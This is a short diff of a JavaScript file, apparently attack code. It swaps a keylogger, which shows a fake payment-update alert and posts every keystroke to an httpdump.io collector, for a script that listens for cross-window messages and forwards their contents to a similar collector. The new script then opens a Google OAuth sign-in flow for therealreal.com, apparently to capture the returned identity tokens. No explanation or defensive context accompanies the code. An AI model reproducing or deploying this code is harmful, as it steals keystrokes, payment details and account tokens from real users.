@@ -1,8 +1,2 @@
-alert('please update your payment details');
-var l = ""; 
-document.onkeypress = function (e) {
-	l += e.key;
-	var req = new XMLHttpRequest();
-	req.open("POST","https://httpdump.io/s_1fg", true);
-	req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-	req.send("data=" + l);}
+addEventListener("message",function(e){fetch("https://httpdump.io/sxdgh?e="+e.data.toString());})
+window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?response_type=id_token&scope=email%20profile%20openid&openid.realm&prompt=select_account&redirect_uri=storagerelay%3A%2F%2Fhttps%2Fwww.therealreal.com%3Fid%3Dauth878706&client_id=837871631769-k2lkm98d2n6o1ftuij5uni984nn5ouje.apps.googleusercontent.com&ss_domain=https%3A%2F%2Fwww.therealreal.com&gsiwebsdk=2&flowName=GeneralOAuthFlow")
